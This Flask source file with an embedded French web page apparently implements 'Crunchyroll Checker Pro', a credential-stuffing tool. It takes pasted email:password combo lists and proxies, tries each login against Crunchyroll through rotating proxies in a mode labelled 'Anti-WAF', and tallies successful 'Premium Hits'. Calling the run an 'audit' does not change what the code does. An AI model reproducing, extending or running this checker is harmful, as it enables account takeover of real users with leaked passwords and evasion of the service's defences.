from flask import Flask, render_template_string, request, jsonify
import threading
import uuid
import random
import os
from chk import CrunchyChecker

app = Flask(__name__)

# Stockage en mémoire (fonctionne grâce au "workers 1" de Gunicorn)
scans = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crunchyroll Checker Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-900 text-white min-h-screen">
    <div class="container mx-auto px-4 py-10 max-w-4xl">
        <div class="text-center mb-10">
            <h1 class="text-5xl font-extrabold text-orange-500 tracking-tight">CRUNCHY CHECKER</h1>
            <p class="text-slate-400 mt-3 font-medium">Déploiement Railway - Mode Anti-WAF (Curl_CFFI)</p>
        </div>

        <div class="grid md:grid-cols-2 gap-6">
            <div class="bg-slate-800 p-6 rounded-2xl border border-slate-700 shadow-2xl">
                <h2 class="text-lg font-bold mb-4 flex items-center gap-2">⚙️ Configuration</h2>
                <div class="space-y-4">
                    <div>
                        <label class="block text-xs font-semibold text-slate-400 uppercase mb-1">Combos (email:pass)</label>
                        <textarea id="combos" class="w-full bg-slate-950 border border-slate-700 rounded-xl p-3 text-sm font-mono h-32 focus:border-orange-500 outline-none transition-all" placeholder="user@mail.com:pass123"></textarea>
                    </div>
                    <div>
                        <label class="block text-xs font-semibold text-slate-400 uppercase mb-1">Proxies (IP:Port)</label>
                        <textarea id="proxies" class="w-full bg-slate-950 border border-slate-700 rounded-xl p-3 text-sm font-mono h-32 focus:border-orange-500 outline-none transition-all" placeholder="1.2.3.4:8080"></textarea>
                    </div>
                    <button onclick="startScan()" id="btnStart" class="w-full bg-orange-600 hover:bg-orange-500 py-4 rounded-xl font-black text-lg transition-all transform active:scale-95 shadow-lg shadow-orange-900/20">Lancer l'audit</button>
                </div>
            </div>

            <div class="bg-slate-800 p-6 rounded-2xl border border-slate-700 shadow-2xl">
                <h2 class="text-lg font-bold mb-4 flex items-center gap-2">📊 Statistiques</h2>
                <div class="grid grid-cols-2 gap-3 mb-6">
                    <div class="bg-slate-950 p-4 rounded-xl border border-green-500/20">
                        <span class="text-3xl font-black text-green-500" id="stat-hits">0</span>
                        <p class="text-[10px] text-slate-500 uppercase font-bold">Premium Hits</p>
                    </div>
                    <div class="bg-slate-950 p-4 rounded-xl border border-red-500/20">
                        <span class="text-3xl font-black text-red-500" id="stat-bad">0</span>
                        <p class="text-[10px] text-slate-500 uppercase font-bold">Invalides</p>
                    </div>
                    <div class="bg-slate-950 p-4 rounded-xl border border-blue-500/20">
                        <span class="text-3xl font-black text-blue-400" id="stat-checked">0</span>
                        <p class="text-[10px] text-slate-500 uppercase font-bold">Vérifiés</p>
                    </div>
                    <div class="bg-slate-950 p-4 rounded-xl border border-orange-500/20">
                        <span class="text-3xl font-black text-orange-400" id="stat-retries">0</span>
                        <p class="text-[10px] text-slate-500 uppercase font-bold">Retries</p>
                    </div>
                </div>
                <div id="log" class="h-44 overflow-y-auto bg-black rounded-xl p-4 text-[11px] font-mono text-slate-400 border border-slate-700">
                    <div class="text-slate-600 italic">// Console système prête...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let scanId = null;
        let poller = null;

        async function startScan() {
            const combos = document.getElementById('combos').value.trim();
            const proxies = document.getElementById('proxies').value.trim();
            if(!combos) return alert("Entrez des combos !");

            document.getElementById('btnStart').disabled = true;
            document.getElementById('btnStart').innerText = "Initialisation...";

            try {
                const res = await fetch('/api/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        combos: combos.split('\\n').filter(l => l.includes(':')),
                        proxies: proxies ? proxies.split('\\n').filter(l => l.length > 5) : []
                    })
                });
                const data = await res.json();
                scanId = data.scanId;
                if(poller) clearInterval(poller);
                poller = setInterval(update, 1500);
            } catch(e) {
                alert("Erreur serveur !");
                document.getElementById('btnStart').disabled = false;
            }
        }

        async function update() {
            if(!scanId) return;
            const res = await fetch(`/api/status/${scanId}`);
            const data = await res.json();
            
            if(data.error) return; // Ignore si non trouvé

            document.getElementById('stat-hits').innerText = data.hits;
            document.getElementById('stat-bad').innerText = data.bad;
            document.getElementById('stat-checked').innerText = data.checked;
            document.getElementById('stat-retries').innerText = data.retries;

            const logDiv = document.getElementById('log');
            logDiv.innerHTML = data.logs.slice(-20).map(l => `<div>${l}</div>`).join('');
            logDiv.scrollTop = logDiv.scrollHeight;

            if(data.finished) {
                clearInterval(poller);
                document.getElementById('btnStart').disabled = false;
                document.getElementById('btnStart').innerText = "Scan Terminé";
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/start', methods=['POST'])
def start_scan():
    data = request.json
    sid = str(uuid.uuid4())
    combos = data.get('combos', [])
    proxies = data.get('proxies', [])
    
    scans[sid] = {'hits':0, 'bad':0, 'checked':0, 'retries':0, 'logs':[], 'finished':False}

    def worker():
        for line in combos:
            try:
                email, password = line.strip().split(':', 1) # Sécurisé contre les pass avec ':'
                success = False
                attempts = 0
                while not success and attempts < 2:
                    proxy = random.choice(proxies) if proxies else None
                    checker = CrunchyChecker(proxy)
                    status, _ = checker.get_token(email, password)
                    
                    if status == "SUCCESS":
                        scans[sid]['hits'] += 1
                        scans[sid]['logs'].append(f"<span class='text-green-500'>[HIT]</span> {email}")
                        success = True
                    elif status == "INVALID":
                        scans[sid]['bad'] += 1
                        scans[sid]['logs'].append(f"<span class='text-red-500'>[BAD]</span> {email}")
                        success = True
                    else:
                        scans[sid]['retries'] += 1
                        attempts += 1
                        scans[sid]['logs'].append(f"<span class='text-yellow-500'>[RETRY]</span> {email}")
                scans[sid]['checked'] += 1
            except Exception as e:
                continue
        scans[sid]['finished'] = True

    threading.Thread(target=worker, daemon=True).start()
    return jsonify({"scanId": sid})

@app.route('/api/status/<sid>')
def get_status(sid):
    return jsonify(scans.get(sid, {"error": "Non trouvé"}))

if __name__ == '__main__':
    # Lecture du port assigné par l'environnement (ex: Railway)
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
